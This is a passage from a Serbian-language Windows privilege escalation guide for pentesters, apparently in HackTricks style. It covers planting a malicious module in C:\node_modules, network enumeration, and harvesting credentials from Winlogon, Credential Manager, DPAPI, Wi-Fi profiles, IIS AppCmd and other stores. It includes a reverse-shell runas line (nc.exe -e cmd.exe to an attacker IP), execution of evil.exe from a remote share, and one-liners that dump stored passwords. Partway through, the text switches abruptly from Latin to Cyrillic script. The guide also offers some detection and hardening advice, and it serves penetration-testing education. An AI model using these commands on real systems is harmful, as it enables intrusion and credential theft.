4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da napravi `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** pokuša da pronađe nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, pa ovo postaje **LPE** kada se cilj pokreće kao administrator, iz zakazanog zadatka/omotača usluge sa povišenim privilegijama ili iz automatski pokrenute desktop aplikacije sa povišenim privilegijama.

Ovo je naročito često kada:

- je zavisnost navedena u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavije `require("foo")` u `try/catch` i nastavi rad nakon greške
- je paket uklonjen iz produkcionih build-ova, izostavljen tokom pakovanja ili instalacija nije uspela
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, a ne u glavnom kodu aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da biste potvrdili putanju razrešavanja modula:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, EXE datoteka Electron aplikacije ili proces omotača)
- Filtrirajte po `Path` koji `contains` `node_modules`
- Obratite pažnju na `NAME NOT FOUND` i poslednje uspešno otvaranje u okviru `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Identifikujte **missing package name** pomoću Procmon-a ili pregledom izvornog koda.
2. Napravite root lookup directory ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Postavite modul sa tačno očekivanim imenom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Primeri nedostajućih opcionih modula iz stvarnog sveta koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo upotrebiti: pronađite bilo koji **nedostajući bare import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili tamo upisuje nove `.js` datoteke/pakete.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji upakujte sve zavisnosti okruženja i proverite upotrebu `optionalDependencies`.
- Pregledajte kôd nezavisnih proizvođača i potražite obrasce `try { require("...") } catch {}` koji ne prikazuju greške.
- Onemogućite opcione provere ako biblioteka to podržava (na primer, neke `ws` implementacije mogu da izbegnu zastarelu proveru za `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Proverite da li su u hosts fajlu hardkodirani drugi poznati računari.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite da li su **ograničene usluge** dostupne spolja.

```bash
netstat -ano #Opened ports?
```

Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsko upravljanje može omogućiti pristup kao njegov desktop korisnik samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija koja radi pod nalogom sa višim privilegijama zaseban je cilj za proveru: listener i putanja binarne datoteke pasivni su tragovi, dok putanja do oštećenja memorije koja zahteva autentifikaciju podrazumeva analizu te konkretne binarne datoteke i ulaznih podataka koji mogu da dopru do nje. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što utvrdite kojoj pozadinskoj usluzi pripada; samo pravilo za prosleđivanje ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila zaštitnog zida

[**Proverite ovu stranicu za komande povezane sa zaštitnim zidom**](../basic-cmd-for-pentesters.md#firewall) **(izlistajte pravila, kreirajte pravila, isključite, isključite...)**

Više[ komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarni fajl `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete slušati na bilo kom portu (prvi put kada upotrebite `nc.exe` za slušanje na portu, GUI će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite WSL sistem datoteka u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje administratorska prava u Windows-u. Ako trenutni Windows identitet može da čita sistem datoteka neke distribucije, pregledajte datoteke istorije shell-a (uključujući `/root/.bash_history`) da biste potražili komande u kojima su možda zabeleženi akreditivi; za eskalaciju je i dalje potreban važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored `LocalState\rootfs` odnosi se na starije instalacije WSL-a; WSL 2 obično čuva distribuciju na [virtuelnom disku `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), zato prvo utvrdite stvarnu distribuciju i putanju za skladištenje. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog popisivanja.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Neprazna vrednost `DefaultPassword` ili `AltDefaultPassword` predstavlja nalaz plaintext vrednosti u registru. Ako je `AutoAdminLogon=1`, ali nijedna plaintext lozinka nije čitljiva, to je samo naznaka: [Sysinternals Autologon može da čuva lozinku kao LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a uobičajeno čitanje registra ne potvrđuje da li taj secret postoji ili može da se preuzme. Proverite prava pristupa i stvarnu konfiguraciju prijavljivanja pre nego što prijavite izložene akreditive.

### Menadžer akreditiva / Windows Vault

Iz [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled, moglo bi da deluje kao da korisnici mogu da čuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to nije način na koji funkcioniše.

Windows Vault čuva akreditive pomoću kojih Windows može automatski da prijavljuje korisnike, što znači da **svaka Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault, kao i da koristi dostavljene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za dati resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa menadžerom akreditiva i zatraži akreditive za taj resurs** iz podrazumevanog vault-a za skladištenje.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na mašini.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možeš koristiti `runas` sa opcijom `/savecred` da bi upotrebio sačuvane akreditive. Sledeći primer poziva udaljeni binarni fajl preko SMB deljenja.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` uz date podatke za prijavu.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) mogu da se koriste.

### UWP PasswordVault / Credential Locker

Savremene Windows UWP aplikacije, Microsoft Edge i savremene sistemske usluge čuvaju tokene za autentifikaciju i lozinke u čistom tekstu unutar Universal Windows Platform (UWP) `PasswordVault` skladišta (prikazanog i kao `Web Credentials` u `vaultcmd`). Ovo skladište je izolovano po sesiji i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Izvršite ovu PowerShell komandu u aktivnoj korisničkoj sesiji da biste odmah napravili dump i dešifrovali sva sačuvana korisnička imena i lozinke u čistom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža način za simetrično šifrovanje podataka i pretežno se koristi u operativnom sistemu Windows za simetrično šifrovanje privatnih asimetričnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu da bi značajno doprinelo entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisničkih tajni za prijavljivanje**. U slučajevima sistemskog šifrovanja koristi sistemske tajne za autentifikaciju domena.

Šifrovani korisnički RSA ključevi, uz korišćenje DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi u istoj datoteci kao i glavni ključ koji štiti korisnikove privatne ključeve**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa se njegov sadržaj ne može prikazati pomoću komande `dir` u CMD-u, ali može putem PowerShell-a.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa akreditivima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete da koristite **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` za dešifrovanje.\
Možete da **izvučete više DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root privilegije).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** se često koriste za **scripting** i zadatke automatizacije kao praktičan način za čuvanje šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili putanju do `.xml` datoteke. Kada skripta ili inventar datoteka ukaže na jednu, utvrdite stvarnu putanju profila naloga umesto da pretpostavite da je `C:\Users`: [Windows profile može smestiti i na druge lokacije](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka samo je trag; [Windows `Export-Clixml` povezuje šifrovani akreditiv sa korisnikom i računarom koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki pronađeni nalog mora zasebno imati odgovarajuća prava na ciljnoj usluzi. Najpre pregledajte putanje i ACL-ove, bez ispisivanja šifrovanih ili otvorenih vrednosti tokom uobičajenog prikupljanja podataka.

Da biste **dešifrovali** PS akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP konekcije

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menadžer akreditiva za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul **Mimikatz** `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete **izvući mnoge DPAPI masterkey vrednosti** iz memorije pomoću modula Mimikatz `sekurlsa::dpapi`

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljiv XML u `%APPDATA%\mRemoteNG` i korisničkom direktorijumu Documents, uključujući datoteke sa uobičajenim nazivima kao što je `config.xml`. Utvrdite šemu veza i šifrovane atribute `Password` pre nego što XML datoteku smatrate tragom za pronalaženje akreditiva. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom opsežnog pretraživanja.

**Remote Desktop Plus izvozi profila** mogu biti čitljivi i u korisničkim direktorijumima ili zajedničkom administrativnom direktorijumu. Nasleđeni izvoz `profiles.xml` sadrži stavke `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Neprazan element lozinke smatrajte tragom za pronalaženje akreditiva, bez ispisivanja njegove vrednosti ili pretpostavke da je u otvorenom tekstu: [dobavljač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojima je profil kreiran, ili podešena tako da bude manje stroga. Potvrdite poreklo datoteke i uslove oporavka pre nego što se oslonite na nju.

### Sticky Notes

Ljudi često koriste aplikaciju StickyNotes na Windows radnim stanicama da bi **sačuvali lozinke** i druge informacije, ne shvatajući da je reč o datoteci baze podataka. Ova datoteka se nalazi na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek vredi potražiti je i pregledati.

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške na putanji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili druge aplikacije mogu koristiti druga skladišta u korisničkom profilu, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladištenja koristi pre nego što odsustvo SQLite datoteke smatrate dokazom da nema beleški.

Ako Sticky Notes koristi SQLite write-ahead logging, sama kopija datoteke `plum.sqlite` možda neće sadržati nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` uz konzistentnu kopiju baze podataka, kao i `plum.sqlite-shm` ako je dostupna; indeks deljene memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite dokumentaciju za WAL](https://www.sqlite.org/wal.html). Beleška koja sadrži ime naloga ili lozinku samo je trag za pronalaženje akreditiva: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Za zapis iz šifrovanog menadžera lozinki potrebni su i stvarni ključ za dešifrovanje i tumačenje specifično za aplikaciju da bi mogao da posluži kao dokaz prijave sa višim privilegijama.

### AppCmd.exe

**Imajte u vidu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga na nivou visokog integriteta.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su neke **akreditacije** konfigurisane i da se mogu **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instalacioni programi se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Fajlovi i Registry (kredencijali)

### Artefakti kredencijala u Registry-ju alata za podršku

Neke starije instalacije alata za daljinsku podršku čuvaju nazive vrednosti povezane sa lozinkama u fiksnim ključevima Registry-ja aplikacije. Na primer, prema [objašnjenju proizvođača o ključu Registry-ja](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` je u verzijama pre 9 označavao konfigurisanu statičku lozinku sesije za TeamViewer. Oznaka u nazivu vrednosti samo je povod za proveru: pre procene tog kredencijala proverite instaliranu verziju, da li su podaci vrednosti čitljivi, njihov format i trenutno ponašanje autentifikacije. Prelazak sa lozinke za daljinsku podršku na privilegovaniji Windows nalog dodatno zahteva da se lozinka zaista ponovo koristi i da imate ovlašćenje za taj nalog. Šifrat i otkrivene lozinke nemojte uključivati u redovni izlaz enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako se sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje fajla** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista ograničava uređivanje i nije bezbednosna funkcija; sama po sebi ne potvrđuje da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene i relevantne fajlove i izbegavajte ispisivanje mogućih tajni tokom široke enumeracije. Čitljiva putanja do `.xlsx` fajla, zaštićen list ili skrivena kolona sami po sebi ne dokazuju da postoje kredencijali niti da neki nalog ima veće privilegije; posebno proverite stvarne podatke i trenutna prava naloga.

### Zadržane zakrpe izmena na CI serveru

CI server može zadržati poslate izmene izvornog koda u svom direktorijumu podataka i nakon završetka build-a. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` kao lokaciju za čuvanje izmena iz udaljenih pokretanja; direktorijum podataka može biti drugačije konfigurisan i ne mora se nalaziti pod `ProgramData`. Čitljiva zakrpa može sačuvati uklonjene ili dodate reference na fajl sa kredencijalima, ključ za šifrovanje ili skriptu koja koristi oba. Na primer, PowerShell tok rada `ConvertTo-SecureString -Key` zahteva i AES ključ i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Najpre proverite samo dostupne nazive zakrpa, a zatим уз одговарајуће овлашћење прегледајте релевантан садржај, не исписујући тајне у редовном излазу енумерације. Путања до закрпе, шифрована вредност или референца на кључ сами по себи не доказују важећи креденцијал нити приступ са већим привилегијама. Ограничите ACL-ове директоријума података и избегавајте уношење тајни у измене build-а.

### Ротација локалне администраторске лозинке по мери

Домаћи ротатор лозинки може да чува шифровану лозинку локалног администратора у локалној услузи, док креденцијале за складиште података држи у читљивом `.env` фајлу или поред бинарног фајла за ажурирање. Заједно проверите заказани задатак ажурирача, налог, ACL-ове конфигурације, listener и дозволе складишта података. Складишту података доступном само преко loopback-а и даље може приступити локални корисник са важећим креденцијалима, али сама аутентификација не доказује да има дозволу за читање релевантних записа. Ако су seed за шифровање или материјал кључа доступни поред шифрата, пре ослањања на шифровање проверите тачан начин извођења кључа. Шема која детерминистички изводи AES кључ из откривеног seed-а користећи Go [`math/rand`](https://pkg.go.dev/math/rand) није погодна за заштиту те лозинке; Go наводи да овај пакет није прикладан за случајност осетљиву на безбедност. Потврдите да је свака откривена лозинка важећа и да припада налогу у локалној групи Administrators пре него што је сматрате путем за ескалацију. Заказани задатак, путања до `.env` фајла или шифровани блок сами по себи не доказују ниједан од тих услова. Не укључујте лозинке и материјал кључа у редовни излаз енумерације.

За управљање локалним администраторским лозинкама користите [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Његово складиште у директоријуму или систему Entra и контроле приступа разликују се од прилагођеног локалног складишта података; [улоге Elasticsearch-а](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) такође одређују да ли аутентификовани корисник складишта података може да чита одређени индекс.

### Архиве Java server plugin-а и поновна употреба креденцијала

Неки Java server plugin-и дистрибуирају се као JAR архиве у директоријуму `plugins` сервера. Читљив прилагођени plugin може садржати конфигурацију или bytecode са уграђеним креденцијалом услуге. Архиву прегледајте само ако имате овлашћење и не укључујте откривене тајне у редовни излаз енумерације. Путања до plugin-а сама по себи не доказује да тајна постоји, а откривена лозинка услуге води до већих привилегија само ако важи и за привилегованији налог. Проверите ACL-ове релевантних фајлова и замените поново коришћене креденцијале различитим тајнама. Погледајте [PaperMC водич за инсталацију plugin-а](https://docs.papermc.io/paper/adding-plugins/) за распоред директоријума и [Oracle JAR документацију](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) за садржај архиве.

### Креденцијали уграђене базе података Openfire-а

Openfire инсталација која користи уграђену базу података може чувати `openfire.script` у `Openfire\embedded-db`. Ако тренутни налог може да га чита, заједно прегледајте записе `OFUSER` и својство `passwordKey`. Openfire [документација о добављачу корисника](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) наводи да лозинке могу бити сачуване у обичном тексту или шифроване кључем који се налази у том својству. Откривена лозинка је важна за ескалацију само ако је и даље важећа за привилегованији идентитет; само име фајла не доказује ни приступ за читање ни поновну употребу креденцијала. Путања је смерница за инвентаризацију, зато не укључујте садржај базе података и креденцијале у редовни излаз енумерације.

Засебан фајл `Openfire\conf\openfire.xml` може открити конфигурисане портове и интерфејс на који се конзола администратора везује, чак и када се користи спољна база података. Openfire обично везује конзолу администратора за loopback; локални налог ипак може приступити тој адреси ако listener ради. Заједно проверите стварни listener, овлашћену улогу администратора, смернице за отпремање plugin-а и идентитет услуге Openfire. Администратор који може да инсталира plugin може довести до извршавања кода plugin-а у контексту услуге, што може подразумевати високе привилегије ако услуга ради као LocalSystem. Лозинка која се поклапа или читљива путања до конфигурације сами по себи не доказују приступ конзоли администратора нити извршавање кода. Погледајте произвођачев [водич за инсталацију и управљање plugin-има](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) и [својство API-ја за отпремање plugin-а](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфигурација сервера за форензичко управљање

Конфигурације Velociraptor сервера, које се обично зову `server.config.yaml`, могу садржати `CA.private_key` интерног CA-а. Ако корисник са нижим привилегијама може да чита тај кључ, можда ће моћи да изда API сертификат клијента. Да ли то води до већих привилегија зависи од улога корисника на серверу, доступности API-ја и идентитета под којим се извршава сервер или циљни agent. Конфигурација клијента садржи другачији материјал; њено проналажење не доказује приступ CA-у сервера. У неким инсталацијама приватни кључ CA-а чува се ван мреже, па читљива конфигурација сервера можда не садржи кључ за потписивање.

На Windows серверу проверите ACL конфигурације **сервера** у његовом директоријуму за инсталацију и свих заштићених резервних копија. Једна могућа локација је `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ако се путања разликује, користите ону која је конфигурисана за услугу. Потврдите да тренутни идентитет може да чита фајл и да је `CA.private_key` заиста присутан. Не исписујте приватни кључ у логове или излаз енумерације. Произвођачев ток рада `config api_client` користи CA кључ за издавање клијентског сертификата, али је потребна и одговарајућа улога на страни сервера; њено креирање или мењање може захтевати приступ за упис у складиште података или поновно покретање. Постојећи привилеговани идентитет сервера може представљати пут чак и када ти уписи нису доступни. API упити са правима за извршавање раде у релевантном контексту сервера или агента, који може имати високе привилегије.

Заштитите конфигурацију сервера и резервне копије рестриктивним ACL-овима, држите CA кључ за потписивање ван мреже где је то могуће и ограничите API улоге и приступ listener-у. Погледајте [Velociraptor API документацију](https://docs.velociraptor.app/docs/server_automation/server_api/) и [смернице за безбедносну конфигурацију](https://docs.velociraptor.app/docs/deployment/security/).

### Putty креденцијали

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

